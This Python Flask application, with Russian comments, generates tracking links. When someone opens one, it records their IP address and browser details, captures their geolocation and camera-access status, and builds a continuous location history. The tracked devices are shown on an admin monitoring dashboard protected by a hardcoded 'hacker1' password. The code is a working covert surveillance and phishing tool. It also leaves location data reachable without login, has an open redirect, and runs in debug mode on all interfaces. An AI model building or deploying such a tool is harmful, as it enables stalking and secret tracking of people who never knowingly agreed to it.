from flask import Flask, render_template, request, redirect, url_for, jsonify, send_from_directory, session, flash
import uuid
import json
import os
import secrets
from datetime import datetime
from functools import wraps

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)  # Генерация случайного секретного ключа для сессий

# Хранение ссылок (в реальном приложении лучше использовать базу данных)
links = {}

# Хранение данных о посещениях
visits = {}

# Хранение истории местоположений
location_history = {}

# Хранение активных сессий отслеживания
active_tracking = {}

# Пути к файлам для хранения данных
LINKS_FILE = 'links.json'
VISITS_FILE = 'visits.json'
LOCATION_HISTORY_FILE = 'location_history.json'

# Загрузка существующих ссылок из файла, если он существует
if os.path.exists(LINKS_FILE):
    with open(LINKS_FILE, 'r') as f:
        links = json.load(f)

# Загрузка существующих данных о посещениях, если файл существует
if os.path.exists(VISITS_FILE):
    with open(VISITS_FILE, 'r') as f:
        visits = json.load(f)

# Загрузка истории местоположений, если файл существует
if os.path.exists(LOCATION_HISTORY_FILE):
    with open(LOCATION_HISTORY_FILE, 'r') as f:
        location_history = json.load(f)

# Создаем директории для статических файлов, если они не существуют
os.makedirs('static/videos', exist_ok=True)


# Функция-декоратор для проверки авторизации
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)

    return decorated_function


@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        # Простая проверка учетных данных (в реальном приложении используйте безопасное хранение паролей)
        if username == 'admin' and password == 'hacker1':
            session['logged_in'] = True
            session['username'] = username

            next_page = request.args.get('next')
            if next_page:
                return redirect(next_page)
            return redirect(url_for('index'))
        else:
            error = 'Пошел Нахуй'

    return render_template('login.html', error=error)


@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    session.pop('username', None)
    return redirect(url_for('login'))


@app.route('/')
@login_required
def index():
    return render_template('index.html', links=links)


@app.route('/generate_link', methods=['POST'])
@login_required
def generate_link():
    user_id = request.form.get('user_id')
    permissions = request.form.getlist('permissions')

    # Проверка, что хотя бы одно разрешение выбрано
    if not permissions:
        return "Нажми уже на хотя бы 1, очередь ты не 1", 400

    # Генерация уникального ID для ссылки
    link_id = str(uuid.uuid4())

    # Сохранение информации о ссылке
    links[link_id] = {
        'user_id': user_id,
        'permissions': permissions,
        'created_at': datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    }

    # Сохранение ссылок в файл
    with open(LINKS_FILE, 'w') as f:
        json.dump(links, f)

    # Формирование полной ссылки с учетом хоста
    generated_link = f"{request.host_url}access/{link_id}"

    return render_template('link_generated.html', link=generated_link, permissions=permissions)


@app.route('/access/<link_id>')
def access(link_id):
    if link_id not in links:
        return "Ссылка не Актуальная", 404

    link_data = links[link_id]

    # Записываем информацию о посещении
    current_time = datetime.now().strftime("%d.%m.%Y %H:%M:%S")

    if link_id not in visits:
        visits[link_id] = []

    # Добавляем новое посещение
    visits[link_id].append({
        'timestamp': current_time,
        'ip': request.remote_addr,
        'user_agent': request.user_agent.string,
        'location': None,  # Будет обновлено через AJAX
        'camera_accessed': False  # Будет обновлено через AJAX
    })

    # Сохраняем данные о посещениях
    with open(VISITS_FILE, 'w') as f:
        json.dump(visits, f)

    # Получаем индекс текущего посещения
    visit_index = len(visits[link_id]) - 1

    # Добавляем в активные отслеживания
    active_tracking[link_id] = {
        'last_update': datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
        'status': 'active'
    }

    return render_template('access.html', link_data=link_data, link_id=link_id, visit_index=visit_index)


@app.route('/update_visit_data', methods=['POST'])
def update_visit_data():
    data = request.json
    link_id = data.get('link_id')
    visit_index = int(data.get('visit_index'))
    location = data.get('location')
    camera_accessed = data.get('camera_accessed', False)

    if link_id in visits and visit_index < len(visits[link_id]):
        visits[link_id][visit_index]['location'] = location
        visits[link_id][visit_index]['camera_accessed'] = camera_accessed

        # Обновляем статус активного отслеживания
        if link_id in active_tracking:
            active_tracking[link_id]['last_update'] = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
            active_tracking[link_id]['status'] = 'active'
        else:
            active_tracking[link_id] = {
                'last_update': datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
                'status': 'active'
            }

        # Сохраняем обновленные данные
        with open(VISITS_FILE, 'w') as f:
            json.dump(visits, f)

        # Сохраняем историю местоположений
        if location:
            if link_id not in location_history:
                location_history[link_id] = []

            # Проверяем, изменилось ли местоположение или прошло достаточно времени
            significant_change = False

            if not location_history[link_id]:
                significant_change = True
            else:
                last_location = location_history[link_id][-1]
                # Проверяем изменение координат
                lat_diff = abs(float(last_location['latitude']) - float(location['latitude']))
                lng_diff = abs(float(last_location['longitude']) - float(location['longitude']))

                # Если координаты изменились хотя бы на 0.00001 (примерно 1 метр)
                if lat_diff > 0.00001 or lng_diff > 0.00001:
                    significant_change = True
                else:
                    # Проверяем, прошло ли достаточно времени с последнего обновления
                    try:
                        last_time = datetime.strptime(last_location['timestamp'], "%d.%m.%Y %H:%M:%S")
                        current_time = datetime.now()
                        # Если прошло более 10 секунд, сохраняем точку даже без изменения координат
                        if (current_time - last_time).total_seconds() > 10:
                            significant_change = True
                    except:
                        # Если не удалось разобрать время, считаем что изменение значительное
                        significant_change = True

            if significant_change:
                # Добавляем новую точку в историю
                location_history[link_id].append({
                    'latitude': location['latitude'],
                    'longitude': location['longitude'],
                    'accuracy': location['accuracy'],
                    'timestamp': datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
                    'speed': location.get('speed', 0),
                    'heading': location.get('heading', 0)
                })

                # Ограничиваем историю до 1000 точек
                if len(location_history[link_id]) > 1000:
                    location_history[link_id] = location_history[link_id][-1000:]

                # Сохраняем историю местоположений
                with open(LOCATION_HISTORY_FILE, 'w') as f:
                    json.dump(location_history, f)

        return jsonify({'status': 'success'})

    return jsonify({'status': 'error', 'message': 'Неверный ID ссылки или индекс посещения'}), 400


@app.route('/get_latest_locations')
def get_latest_locations():
    """Возвращает последние местоположения для всех активных пользователей"""
    latest_locations = {}

    for link_id, visit_list in visits.items():
        if visit_list and visit_list[-1]['location']:
            latest_locations[link_id] = visit_list[-1]['location']

            # Добавляем информацию о статусе отслеживания
            if link_id in active_tracking:
                latest_locations[link_id]['tracking_status'] = active_tracking[link_id]['status']
                latest_locations[link_id]['last_update'] = active_tracking[link_id]['last_update']
            else:
                latest_locations[link_id]['tracking_status'] = 'inactive'

    return jsonify(latest_locations)


@app.route('/get_location_history/<link_id>')
def get_location_history(link_id):
    """Возвращает историю местоположений для конкретного пользователя"""
    if link_id in location_history:
        return jsonify(location_history[link_id])

    return jsonify([])


@app.route('/monitoring')
@login_required
def monitoring():
    # Подготовка данных для мониторинга
    monitoring_data = []

    for link_id, visit_list in visits.items():
        if link_id in links:
            user_id = links[link_id]['user_id']
            permissions = links[link_id]['permissions']

            for visit in visit_list:
                # Добавляем информацию о статусе отслеживания
                tracking_status = 'inactive'
                last_update = None

                if link_id in active_tracking:
                    tracking_status = active_tracking[link_id]['status']
                    last_update = active_tracking[link_id]['last_update']

                monitoring_data.append({
                    'user_id': user_id,
                    'link_id': link_id,
                    'timestamp': visit['timestamp'],
                    'location': visit['location'],
                    'camera_accessed': visit['camera_accessed'],
                    'permissions': permissions,
                    'tracking_status': tracking_status,
                    'last_update': last_update
                })

    # Сортировка по времени (новые сверху)
    monitoring_data.sort(key=lambda x: x['timestamp'], reverse=True)

    return render_template('monitoring.html', monitoring_data=monitoring_data)


@app.route('/devices')
@login_required
def devices():
    """Страница управления устройствами"""
    devices_data = []

    # Собираем данные об устройствах
    for link_id, link_data in links.items():
        user_id = link_data['user_id']
        created_at = link_data['created_at']

        # Получаем последнее известное местоположение
        last_location = None
        last_update = None
        tracking_status = 'inactive'

        if link_id in visits and visits[link_id]:
            last_visit = visits[link_id][-1]
            last_location = last_visit['location']

            if link_id in active_tracking:
                tracking_status = active_tracking[link_id]['status']
                last_update = active_tracking[link_id]['last_update']

        devices_data.append({
            'user_id': user_id,
            'link_id': link_id,
            'created_at': created_at,
            'last_location': last_location,
            'tracking_status': tracking_status,
            'last_update': last_update
        })

    # Сортировка по времени создания (новые сверху)
    devices_data.sort(key=lambda x: x['created_at'], reverse=True)

    return render_template('devices.html', devices_data=devices_data)


# Добавим маршрут для удаления устройств
@app.route('/delete_devices', methods=['POST'])
@login_required
def delete_devices():
    """Удаление выбранных устройств"""
    selected_devices = request.form.getlist('selected_devices')

    if not selected_devices:
        flash('Не выбрано ни одного устройства для удаления', 'warning')
        return redirect(url_for('monitoring'))

    deleted_count = 0

    for link_id in selected_devices:
        if link_id in links:
            # Удаляем информацию о ссылке
            del links[link_id]

            # Удаляем информацию о посещениях
            if link_id in visits:
                del visits[link_id]

            # Удаляем историю местоположений
            if link_id in location_history:
                del location_history[link_id]

            # Удаляем информацию об активном отслеживании
            if link_id in active_tracking:
                del active_tracking[link_id]

            deleted_count += 1

    # Сохраняем обновленные данные
    with open(LINKS_FILE, 'w') as f:
        json.dump(links, f)

    with open(VISITS_FILE, 'w') as f:
        json.dump(visits, f)

    with open(LOCATION_HISTORY_FILE, 'w') as f:
        json.dump(location_history, f)

    flash(f'Успешно удалено устройств: {deleted_count}', 'success')
    return redirect(url_for('monitoring'))


@app.route('/upload')
@login_required
def upload_page():
    """Страница для загрузки видеофона"""
    return render_template('upload.html')


@app.route('/upload_video', methods=['POST'])
@login_required
def upload_video():
    """Метод для загрузки видео"""
    if 'video' not in request.files:
        return jsonify({'status': 'error', 'message': 'Файл не найден'}), 400

    video_file = request.files['video']
    if video_file.filename == '':
        return jsonify({'status': 'error', 'message': 'Файл не выбран'}), 400

    if video_file and allowed_file(video_file.filename, {'mp4', 'webm', 'mov'}):
        # Сохраняем с именем background.mp4
        video_file.save(os.path.join('static/videos', 'background.mp4'))
        return jsonify({'status': 'success', 'message': 'Видео успешно загружено'})

    return jsonify({'status': 'error', 'message': 'Неподдерживаемый формат файла'}), 400


def allowed_file(filename, allowed_extensions):
    """Проверка разрешенных расширений файла"""
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in allowed_extensions


# Функция для проверки активности отслеживания
def check_tracking_activity():
    """Проверяет активность отслеживания и обновляет статусы"""
    now = datetime.now()
    for link_id, data in list(active_tracking.items()):
        try:
            last_update_time = datetime.strptime(data['last_update'], "%d.%m.%Y %H:%M:%S")
            # Если последнее обновление было более 2 минут назад, считаем отслеживание неактивным
            if (now - last_update_time).total_seconds() > 120:
                active_tracking[link_id]['status'] = 'inactive'
                print(f"Отслеживание для {link_id} помечено как неактивное")
        except Exception as e:
            print(f"Ошибка при проверке активности для {link_id}: {e}")


# Запускаем проверку активности при каждом запросе к API
@app.before_request
def before_request():
    if request.endpoint in ['get_latest_locations', 'get_location_history']:
        check_tracking_activity()


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
